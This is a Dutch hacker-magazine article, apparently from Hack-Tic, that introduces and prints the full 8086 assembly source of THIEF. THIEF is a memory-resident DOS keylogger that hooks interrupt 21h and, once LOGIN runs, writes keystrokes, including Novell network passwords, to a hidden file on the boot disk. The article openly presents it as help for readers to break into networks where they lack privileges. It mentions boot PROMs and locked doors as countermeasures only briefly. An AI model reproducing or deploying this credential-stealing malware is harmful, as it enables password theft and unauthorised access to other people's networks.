;redaktie van The Key, John D., Tx, Herman Acker, Peter Poelman, Paul en Rop.
;Nadruk wordt door de redaktie toegestaan!
;------------------------------------------------------------------------------
;
;  Als je via een Local Area Network onder MS-DOS files wilt kunnen bewerken
;kun je bijna niet om de Novell networksoftware heen. Of je nou op je werk of
;op school met Novell werkt: je hebt altijd te weinig bevoegdheid op het
;systeem. Hack-Tic helpt je door te dringen in het systeem met dit artikel van
;een anonieme auteur.
;
;  THIEF is een TSR (Terminate and Stay Resident; geheugen-resident) programma
;voor de IBM-compatible, geschreven in 8086 machinetaal. Het probeert om
;wachtwoorden voor het Novell PC Local Area Netwerk te stellen. De oorsprong
;van THIEF ligt op een school met een bloeiende hack-cultuur: George Washington
;High School in Denver, Colorado USA.
;  Deze school is meer dan goed voorzien van IBM micro's. Vijf lokalen van 30
;computers hangen allemaal via een ethernet aan elkaar. Het netwerk draait
;onder Novell. Vier van de vijf lokalen gebruiken boot-proms [geheugenchips op
;de netwerk-interfacekaart. Zij zorgen ervoor dat er opgestart kan worden
;zonder dat er een disk (of zelfs een drive(!) nodig is op de betreffende
;machine.] voor het opstarten van de PC's. De vijfde ruimte bevat IBM PS/2
;model 80's(!) met harddisks. De systeembeheerders en andere "power-users"
;maken graag gebruik van deze machines. Deze machines "booten" vanaf hun eigen
;hard-disks, zij gebruiken geen boot-proms.
;  Op een van deze computers werd THIEF voor het eerst gesignaleerd. THIEF
;maakt namelijk gebruik van een zwakheid in de beveiliging tijdens de bootfase.
;In de AUTOEXEC.BAT file werd een extra regel toegevoegd die een "verborgen"
;programma op de bootschijf activeerde. Zodra er echter een programma met de
;naam LOGIN wordt uitgevoerd komt THIEF tot leven en hij slaat alle
;toetsaanslagen op in een (eveneens verborgen) file op de boot disk. De
;onbevoegde kan later terugkomen en kijken wat zijn val gevangen heeft.
;  Voordat we het "metabolisme" van THIEF verder gaan ontleden eerst even de
;zwakheden die deze hack mogelijk maken:
;  -Een boot-proces dat veranderd kan worden
;  -Fysieke toegang (door een onbevoegde) tot de computer
;  Beide zijn goed te verhelpen. Boot-proms en een slot op de deur en klaar is
;Kees.
;  Terug naar het "metabolisme". Nogal verassend is dat het programma dezelfde
;"hook" gebruikt als de Novell shell. Het grijpt de centrale toegang naar DOS:
;interrupt 21h [ (hex) wordt door programma's gebruikt om een DOS functie aan te
;roepen. De Novell-Netware shell onderschept deze stroom om zondig zelf op
;bepaalde verzoeken te reageren. ]. Het onderschept alle aanroepen naar DOS.
;Zodra een EXECute file call wordt gemaakt met de filename LOGIN worden alle
;toetsaanslagen vastgelegd totdat het programma terugkeert naar DOS. Tijdens het
;LOGIN process wordt het Novell wachtwoord ingetikt en dus is de hacker een
;wachtwoord rijker. Het is allemaal nog iets te ingewikkeld: het programma had
;ook gewoon op de speciale Novell inlog functieaanroep kunnen wachten.Maar ach,
;zo werkt het ook.
;  Dit soort programma's zijn alles behalve nieuw. Ze zijn net zo oud als
;wachtwoord-beveiliging. Bestudering van dit programma geeft meer inzicht in de
;problematiek van LAN-beveiliging.
;  De toekomst zal zeker geheel nieuwe identificatietechnieken brengen. Net zo
;zeker is dat zij begroet zullen worden door geduldige, enigszins doortrapte
;genialiteit.
;
;  Opmerking: THIEF werd door zijn maker ook wel eens GETIT genoemd. De maker
;was gelukkig onvoorzichtig genoeg om de sourcecode te laten slingeren.
;
;
;                       DE CODE VAN THIEF:
;
;
cseg    segment
        assume  cs:cseg,ds:cseg

        org 100h
        public oi21,ac,ob,fn,fh,flag,ni21,jtov,oc,lethro,wpwtf,exist,create,
        public cntr,lits,begin
            
        .RADIX  16
start:
        push cs
        push cs
        push cs
        pop ds
        pop es
        mov ax,0fffeh
        CLI
        pop ss
        mov sp,ax
        STI
        jmp begin
oi21    dd ?
ac      dw 0
ob      dw 80h dup (?)
buff2   db 80h dup (?)
fn      db 'c:\testing.tmp',0,'                  '
search1 db 'LOGIN'
foundf  db 0
fh      dw 0
flag    db 0
cntr    dw 0

ni21:
        assume cs:cseg,ds:nothing,es:nothing
        cmp ax,4b00h
        je exec
        cmp foundf,0ffh
        jne nc
        cmp ah,8
        je  oc
        cmp ah,7
        je oc

nc:
        push ax
        mov al,cs:flag
        not al
        cmp al,0
        jne jtov
        mov ax,cntr
        inc ax
        mov cntr,ax
        cmp ax,31h
        jb  jtov
        xor ax,ax
        mov cntr,ax
        mov flag,al
        pop ax
        pushf
        call dword ptr [oi21]
        push ds
        push cs
        pop ds
        push ax
        push bx
        push cx
        push dx
        jmp short wpwtf

jtov:
        pop ax
        jmp dword ptr cs:[oi21]

exec:   call scanfor
        jmp nc
oc:

        pushf
        call dword ptr cs:[oi21]
        assume ds:cseg
        push ds
        push cs
        pop  ds
        push ax
        push bx
        push cx
        push dx
        mov bx,ac
        mov [bx],al
        inc bx
        mov [ac],bx
        cmp al,0dh
        jne lethro
        mov byte ptr [bx],0ah
        not cs:[flag]
lethro:
        pop dx
        pop cx
        pop bx
        pop ax
        pop ds
        iret

scanfor:
        push ax
        push di
        push si
        push es
        push ds
        push cs
        push cs
        pop es
        mov si,dx
        mov di,offset buff2
moveit:
        lodsb
        and al,0dfh
        stosb
        or al,al
        jnz moveit
        pop ds
        mov di,offset buff2
look:
        push di
        mov si,offset search1
        mov cx,5
        repe cmpsb
        pop di
        or cx,cx
        jz foundit
        inc di
        cmp byte ptr [di+5],0
        je not_found
        jmp look
not_found:
        xor ax,ax
        mov foundf,al
        jmp short endofsearch
foundit:
        mov ax,0ffh
        mov foundf,al
endofsearch:
        pop ds
        pop es
        pop si
        pop di
        pop ax
        ret

wpwtf:
       mov ax,3d02h
       mov dx,offset fn
       pushf
       call dword ptr [oi21]
       jnc exist
       cmp al,2
       je create
       jmp lethro
create:
       mov ah,3ch
       mov dx,offset fn
       mov cx,02h+04h
       pushf
       call dword ptr [oi21]
       jnc exist
       jmp lethro
exist:
       mov fh,ax
       mov bx,ax
       mov ax,4202h
       xor cx,cx
       xor dx,dx
       pushf
       call dword ptr [oi21]
       mov cx,[ac]
       mov dx,offset ob
       sub cx,dx
       mov [ac],dx
       inc cx
       mov bx,fh
       mov ah,40h
       pushf
       call dword ptr [oi21]
       mov ah,3eh
       mov bx,fh
       pushf
       call dword ptr [oi21]
       jmp lethro

lits   db 90h
begin:
       mov ax,offset ob
       mov [ac],ax
       mov ax,3521h
       int 21h
       mov di,offset oi21
       mov [di],bx
       mov [di+2],es
       mov dx,offset ni21
       push cs
       pop ds
       mov ax,2521h
       int 21h
       mov dx,offset lits
       int 27h
cseg   ends
       end start
